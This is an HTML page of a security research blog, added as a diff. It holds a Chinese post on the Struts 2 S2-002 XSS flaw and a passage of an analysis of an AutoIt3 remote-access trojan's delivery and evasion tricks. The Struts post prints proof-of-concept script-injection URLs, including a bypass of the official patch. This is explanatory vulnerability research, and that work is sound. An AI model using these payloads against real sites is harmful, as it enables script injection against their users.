@@ -1,0 +1,1544 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="BruceWang,王小龍">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="filtering noise and focusing on threats">
+<meta name="keywords" content="BruceWang,王小龍">
+<meta property="og:type" content="website">
+<meta property="og:title" content="BruceWang&#39;s Blog">
+<meta property="og:url" content="http://blog.bruce.wang/index.html">
+<meta property="og:site_name" content="BruceWang&#39;s Blog">
+<meta property="og:description" content="filtering noise and focusing on threats">
+<meta property="og:locale" content="default">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BruceWang&#39;s Blog">
+<meta name="twitter:description" content="filtering noise and focusing on threats">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://blog.bruce.wang/">
+
+
+
+
+
+  <title>BruceWang's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BruceWang's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">王小龍的博客</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://blog.bruce.wang/2017/12/11/Struts 2 漏洞系列之 S2-002/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BruceWang">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceWang's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/11/Struts 2 漏洞系列之 S2-002/" itemprop="url">Struts 2 漏洞系列之 S2-002</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-11T11:11:11+08:00">
+                2017-12-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞研究/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;由于&nbsp;Struts&nbsp;2&nbsp;框架在处理&nbsp;<code>&lt;s:url&gt;</code>&nbsp;和&nbsp;<code>&lt;s:a&gt;</code>&nbsp;两个标签时，未对标签内的字符进行有效转义，导致存在 XSS 注入漏洞。该漏洞主要有两个利用场景如下&#x3a;</p>
+<ul>
+<li>场景一：在&nbsp;<code>&lt;s:a&gt;</code>&nbsp;标签中，注入未转义的双引号导致&nbsp;XSS&nbsp;漏洞。</li>
+<li>场景二：在&nbsp;<code>&lt;s:url&gt;</code>&nbsp;和&nbsp;<code>&lt;s:a&gt;</code>&nbsp;标签中，当参数&nbsp;includeParams&nbsp;的值不为&nbsp;“none”&nbsp;时，不会对&nbsp;<code>&lt;script&gt;</code>&nbsp;标签进行转义，导致&nbsp;XSS&nbsp;漏洞。</li>
+</ul>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;官方给出的&nbsp;POC&nbsp;是：<code>http://localhost/foo/bar.action?&lt;script&gt;alert(1)&lt;/script&gt;test=hello</code>。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;我们知道标签一般分为两大类，一类是通用型的，另一类是界面（&nbsp;UI&nbsp;）型的。通用标签中，又分控制标签和数据标签两种。而此处所提到的&nbsp;<code>&lt;s:a&gt;</code>&nbsp;和&nbsp;<code>&lt;s:url&gt;</code>&nbsp;实际上都是属于&nbsp;Struts&nbsp;2&nbsp;框架中的两种数据标签。其中，<code>&lt;s:a&gt;</code>&nbsp;标签负责处理超链接，生成&nbsp;HTML&nbsp;中的&nbsp;<code>&lt;a&gt;</code>&nbsp;标签。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;早先的&nbsp;Struts&nbsp;1&nbsp;框架中的是通过解析&nbsp;EL（Expression Language）表达式来计算超链接地址的，在&nbsp;Struts&nbsp;2.0.0.11&nbsp;之后就不再支持&nbsp;EL（Expression Language）表达式，改用&nbsp;OGNL&nbsp;表达式，<code>&lt;s:url&gt;</code>&nbsp;标签的作用之一就是将&nbsp;OGNL&nbsp;表达式的计算结果传递给&nbsp;<code>&lt;s:a&gt;</code>&nbsp;标签，以便生成超链接地址。使用这两个标签前，要先用这个姿势引入标签库：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span> = <span class="string">"s"</span> <span class="attr">uri</span> = <span class="string">"/struts-tags"</span>%&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;解释完标签，我们再来看看&nbsp;<code>includeParams</code>&nbsp;属性的作用。<code>&lt;s:url&gt;</code>&nbsp;和&nbsp;<code>&lt;s:a&gt;</code>&nbsp;两个标签中都有&nbsp;<code>includeParams</code>&nbsp;属性，该属性主要作用是指定在何种情况下&nbsp;HTTP&nbsp;request&nbsp;请求需要包含参数。在全局配置中默认为&nbsp;<code>none</code>，配置信息如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">   ...</span><br><span class="line">   <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.url.includeParams"</span> <span class="attr">value</span>=<span class="string">"none"</span> /&gt;</span></span><br><span class="line">   ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;该属性有三个值可供选择：<code>all</code>、<code>get</code>&nbsp;和&nbsp;<code>none</code>。当该属性设置为&nbsp;<code>all</code>&nbsp;时，表示不管&nbsp;GET&nbsp;或&nbsp;POST&nbsp;请求，该&nbsp;URL&nbsp;都需要包含参数；当该属性设置为&nbsp;<code>get</code>&nbsp;时，表示仅在&nbsp;GET&nbsp;请求时，该&nbsp;URL&nbsp;才需要包含参数；当该属性设置为&nbsp;<code>none</code>&nbsp;时，表示不论&nbsp;GET&nbsp;或&nbsp;POST&nbsp;请求，该&nbsp;URL&nbsp;都不需要包含参数。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;因此，场景二就不难理解，如果&nbsp;<code>includeParams</code>&nbsp;属性设置为&nbsp;<code>none</code>&nbsp;了，所注入的地址就会不接受参数而导致&nbsp;XSS&nbsp;漏洞无法有效触发。</p>
+<h2 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码"></a>修复代码</h2><p>原始漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//if the action was not explicitly set grab the params from the request</span></span><br><span class="line"><span class="keyword">if</span> (escapeAmp) &#123;</span><br><span class="line">    buildParametersString(params, link);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    buildParametersString(params, link, <span class="string">"&amp;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">String result;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = encodeResult ? response.encodeURL(link.toString()) : link.toString();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">    <span class="comment">// Could not encode the URL for some reason</span></span><br><span class="line">    <span class="comment">// Use it unchanged</span></span><br><span class="line">    result = link.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>官方补丁代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//if the action was not explicitly set grab the params from the request</span></span><br><span class="line"><span class="keyword">if</span> (escapeAmp) &#123;</span><br><span class="line">    buildParametersString(params, link);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    buildParametersString(params, link, <span class="string">"&amp;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">String result = link.toString();</span><br><span class="line"><span class="keyword">while</span> (result.indexOf(<span class="string">"&lt;script&gt;"</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    result = result.replaceAll(<span class="string">"&lt;script&gt;"</span>, <span class="string">"script"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">     result = encodeResult ? response.encodeURL(result) : result;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">    <span class="comment">// Could not encode the URL for some reason</span></span><br><span class="line">    <span class="comment">// Use it unchanged</span></span><br><span class="line">    result = link.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;可以看到，官方修复的做法是，循环检测&nbsp;<code>&lt;s:url&gt;</code>&nbsp;和&nbsp;<code>&lt;s:a&gt;</code>&nbsp;标签内的数据，如果存在&nbsp;<code>&lt;script&gt;</code>&nbsp;就将其替换为&nbsp;<code>script</code>&nbsp;，去掉了&nbsp;<code>&lt;</code>&nbsp;和&nbsp;<code>&gt;</code>&nbsp;字符，直到不存在&nbsp;<code>&lt;script&gt;</code>&nbsp;标签为止。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;根据阿里巴巴安全专家吴翰清的&nbsp;《白帽子讲&nbsp;WEB&nbsp;安全》&nbsp;书中所述，刚开始官方修复的方式是用&nbsp;<code>if</code>&nbsp;简单的去掉一层&nbsp;<code>&lt;script&gt;</code>&nbsp;标签，直到有人提出可以构造&nbsp;<code>&lt;&lt;script&gt;&gt;</code>&nbsp;或&nbsp;<code>&lt;&lt;&lt;script&gt;&gt;&gt;</code>&nbsp;这样的标签来绕过官方的补丁，后来官方发布的补丁中仅仅是把&nbsp;<code>if</code>&nbsp;换成了&nbsp;<code>while</code>。然而，吴翰清提出，这样的修复并不完善，仍然可以通过下面的方法绕过：</p>
+<p><code>http://localhost/foo/bar.action?&lt;script test=hello&gt;alert(1)&lt;/script&gt;test=hello</code></p>
+<h2 id="挖洞思路"><a href="#挖洞思路" class="headerlink" title="挖洞思路"></a>挖洞思路</h2><ul>
+<li>需要了解&nbsp;Struts&nbsp;2&nbsp;框架的常用标签。</li>
+<li>需要熟悉&nbsp;XSS&nbsp;的原理。</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li>官方的&nbsp;<a href="https://cwiki.apache.org/confluence/display/WW/S2-002" target="_blank" rel="noopener">漏洞链接</a>。</li>
+<li>更多内容请关注&nbsp;<a href="http://bruce.wang" target="_blank" rel="noopener">王小龍的博客</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://blog.bruce.wang/2017/12/07/一种 Au3 远控木马变种样本分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BruceWang">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceWang's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/07/一种 Au3 远控木马变种样本分析/" itemprop="url">一种 Au3 远控木马变种样本分析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-07T11:11:11+08:00">
+                2017-12-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/威胁情报/" itemprop="url" rel="index">
+                    <span itemprop="name">威胁情报</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="1-nbsp-Au3-nbsp-简介"><a href="#1-nbsp-Au3-nbsp-简介" class="headerlink" title="1&nbsp;Au3&nbsp;简介"></a>1&nbsp;Au3&nbsp;简介</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;AutoIt3&nbsp;（简称&nbsp;Au3）是一种能够在&nbsp;Windows&nbsp;GUI&nbsp;或&nbsp;DOS&nbsp;上实现一系列自动化任务的脚本语言，其语法类似BASIC。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;使用&nbsp;Au3&nbsp;开发的程序，能够具有以下功能：</p>
+<ul>
+<li>模拟击键和鼠标移动操作；</li>
+<li>对窗口和进程进行操作；</li>
+<li>与所有标准的&nbsp;Windows&nbsp;控件进行交互。</li>
+<li>编译的独立可执行文件无需安装任何运行环境。</li>
+<li>可创建图形用户界面（&nbsp;GUI&nbsp;）；</li>
+<li>支持&nbsp;COM&nbsp;；</li>
+<li>支持正则表达式；</li>
+<li>可直接调用外部&nbsp;DLL&nbsp;和&nbsp;Windows&nbsp;API&nbsp;函数；</li>
+<li>可实现&nbsp;RunAs&nbsp;功能；</li>
+<li>兼容大多数&nbsp;Windows&nbsp;版本；</li>
+<li>支持&nbsp;Unicode&nbsp;和&nbsp;64&nbsp;位操作系统。</li>
+<li>支持数字签名。</li>
+<li>支持用户账户控制（&nbsp;UAC&nbsp;）。</li>
+</ul>
+<h2 id="2-nbsp-变种木马简介"><a href="#2-nbsp-变种木马简介" class="headerlink" title="2&nbsp;变种木马简介"></a>2&nbsp;变种木马简介</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;近期，本人通过在网上部署的各个&nbsp;VPS&nbsp;节点蜜罐，捕获到一种新型的&nbsp;Au3&nbsp;脚本木马变种。在以往，大多数以&nbsp;Au3&nbsp;编码的恶意程序攻击中，主要都是以窃取键盘输入的木马为主，比如，2016&nbsp;年腾讯电脑管家在&nbsp;FreeBuf&nbsp;上报道的&nbsp;&#x300a;<a href="http://www.freebuf.com/articles/system/119695.html" target="_blank" rel="noopener">异次元窃贼：使用AutoIt脚本进行键盘记录窃取的“新奇玩法”</a>&#x300b;&nbsp;所述。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;本次所捕获的新型变种，保留了以往的利用代码框架，但功能上明显增强，甚至还有部分神秘的功能模块可能还处于测试阶段，没有被攻击程序调用。可以认为，该新型木马变种的作者在原有的利用代码框架上，进行了增配和强化，使其完全具备远控木马的功能。甚至利用了&nbsp;Au3&nbsp;脚本自身的优越姿势，模拟人的键鼠操作，“手动”&nbsp;退出了某厂商的些杀软进程（比如国际著名的&nbsp;Avast杀毒软件）。</p>
+<h2 id="3-nbsp-变种木马分析"><a href="#3-nbsp-变种木马分析" class="headerlink" title="3&nbsp;变种木马分析"></a>3&nbsp;变种木马分析</h2><h3 id="3-1-nbsp-可疑文件"><a href="#3-1-nbsp-可疑文件" class="headerlink" title="3.1&nbsp;可疑文件"></a>3.1&nbsp;可疑文件</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;可疑文件被嵌入在某文档中，以邮件的方式进行传播:</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-8bf967ce8a9f0572.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="被嵌入可执行程序的文档"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;提取出可执行程序样本后，发现该样本为&nbsp;RAR&nbsp;自解压程序：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-52e43245bfe5c95d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="嵌入的可执行文件为&nbsp;RAR&nbsp;自解压程序"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;使用&nbsp;RAR&nbsp;打开后，发现攻击者在解压配置中加入了某国语言的热门小说内容来逃避杀软检测：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-884b8294f64689f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="自解压配置中存在混淆信息"><br>&nbsp;&nbsp;&nbsp;&nbsp;清理解压配置中无用信息后得到配置信息如图：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-0e732f768038e6ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="自解压配置信息"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;分析自解压的配置信息发现，当用户双击文档中嵌入的&nbsp;exe&nbsp;程序时会触发自解压程序，将压缩包文件尽数解压到&nbsp;&#x25;temp&#x25;&#x5c;xxxx&nbsp;目录下，该解压过程中的进度条被隐藏。且在解压过程中，如果遇到文件已存在的情况，则会直接覆盖（不会提示用户）。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;分析解压后的文件发现，压缩包内存在各种类型的文件共二十多个， 其后缀名包括：bmp、mp3、dat、icm、jpg、ppt、docx、pdf、xl、ico、txt、exe&nbsp;等。其中，除了&nbsp;file1&#x2e;exe&nbsp;和&nbsp;file2、file3&nbsp;文件之外，其他的文件皆为文本文件：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-85971a2a2c5e7fc7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="压缩包内文件类型"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;任意打开压缩包内的文本文件发现，这些文本文件的内容都是一些字符串，此处推测这些文件存在的目的可能是为了欺骗杀软对压缩包内容的检测：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-ee2b1954c7c76d2c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="压缩包内的文本文件"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;分析&nbsp;file1&#x2e;exe、&nbsp;file2、file3&nbsp;三个文件后发现：file1&#x2e;exe&nbsp;是&nbsp;Au3&nbsp;脚本的解释器，file2&nbsp;是&nbsp;Au3&nbsp;脚本，file3&nbsp;为&nbsp;ini&nbsp;配置文件。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;对可执行程序&nbsp;file1&#x2e;exe&nbsp;进行查杀发现，全球&nbsp;63&nbsp;款主流杀软对该文件的检出率为&nbsp;0&nbsp;。这种情况只有两种可能，一种可能是该程序确实为&nbsp;Au3&nbsp;官方发布的安全程序；另一种可能是该程序经过牛逼的免杀处理后，对全球主流杀软都具有免杀能力。这里唯一可以确定的一点是，该程序确实是&nbsp;Au3&nbsp;脚本的解释器，确实能够运行&nbsp;Au3&nbsp;脚本。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-8ab1ec5181a89622.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="file1.exe 查杀结果"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;file1&#x2e;exe&nbsp;文件的签名情况如下：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-ab6459766840f93d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="file1.exe 签名信息"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;直接双击运行&nbsp;file1&#x2e;exe&nbsp;时，会提示选择用户手动一个&nbsp;Au3&nbsp;脚本（来编译并执行）：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-c059edfbacc7aeb2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="双击 file1.exe 时"></p>
+<h3 id="3-2-nbsp-脚本分析"><a href="#3-2-nbsp-脚本分析" class="headerlink" title="3.2&nbsp;脚本分析"></a>3.2&nbsp;脚本分析</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;对&nbsp;file2&nbsp;进行分析发现，该脚本文件的源码通过大量增加无用注释（&#x3b;&nbsp;号开头的行都是单行注释）和无用代码（&#x23;&#x2d;d&#x2d;d&#x2d;d&nbsp;开头的大多是无用代码，且不干扰程序正常运行）的方式来增加内容和文件体积，此处推测目的是用于提高静态检测的难度以及使用大文件来逃避多数杀软的云查杀功能。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-0e7b85b5115a8d5a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="file2 内容充满无用的注释"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;删除无用行后得到&nbsp;6&nbsp;KB&nbsp;的代码：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-97020eb9e8bea4a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="file2 源码开头"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;从代码可知，file2&nbsp;脚本运行时会加载&nbsp;file3&nbsp;的的内容，那么&nbsp;file3&nbsp;是不是程序的配置文件呢？我们载入&nbsp;file3&nbsp;来看看：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-a313259bbf55721f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="file3 文件内容片段"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;file3&nbsp;中出现了熟悉的&nbsp;&#x5b;Setting&#x5d;，没错，经过分析发现&nbsp;file3&nbsp;就是一个&nbsp;ini&nbsp;配置文件。为了后续的分析更加直观，我们接下来将&nbsp;file1&#x2e;exe&nbsp;改名为&nbsp;AutoIt3&#x2e;exe，将&nbsp;file2&nbsp;改名为&nbsp;main&#x2e;au3，将&nbsp;file3&nbsp;改名为&nbsp;config&#x2e;ini。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;研究发现，该脚本执行过程的简述如下：</p>
+<ul>
+<li>1&#x2e;&nbsp;当解压操作完成时，程序会自动以当前用户的权限运行&nbsp;AutoIt3&#x2e;exe&nbsp;，再由&nbsp;AutoIt3&#x2e;exe&nbsp;编译并执行脚本文件&nbsp;main&#x2e;au3。</li>
+<li>2&#x2e;&nbsp;main&#x2e;au3&nbsp;脚本执行后会从配置文件&nbsp;config&#x2e;ini&nbsp;中加载加密的代码段，以及解密所需的密钥和其他配置参数。</li>
+<li>3&#x2e;&nbsp;紧接着进行解密操作，在当前目录下生成一个临时文件，文件名为五位随机大写字母且每次运行生成的文件名皆不同。该临时文件被用于写入解密之后&nbsp;Au3&nbsp;脚本代码，此处我们称生成的新文件为&nbsp;attack&#x2e;au3。</li>
+<li>4&#x2e;&nbsp;attack&#x2e;au3&nbsp;生成后，会立即被主程序编译并载入内存执行。新脚本运行之后随即删除自身的临时文件，并再次载入配置文件&nbsp;config&#x2e;ini。</li>
+<li>5&#x2e;&nbsp;此时，会根据配置文件内的&nbsp;&#x201c;定制化配置&#x201d;&nbsp;参数，以及当前的运行环境来加载不同的攻击函数模块。为了构造攻击所需的&nbsp;&#x201c;payload&#x201d;，脚本程序会从配置文件中读取新的加密代码段及新的解密密钥。</li>
+<li>6&#x2e;&nbsp;当一系列攻击操作完成时，被入侵的主机会主动向&#x20;&#x43;&#x26;&#x43;&#x20;服务器发起回连请求。</li>
+</ul>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;综上所述，整个木马程序的执行流程如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">+-----------+      +------------------+      +------------------+      +-------------------------+</span><br><span class="line">| User Open |      |  User dblclick   |      | extracting files |      | Auto Run:               |</span><br><span class="line">| xxxx.docx +----&gt; | xxxx.exe in docx +----&gt; | to %temp%\xxxx\* +----&gt; | ./AutoIt3.exe main.au3  |</span><br><span class="line">+-----------+      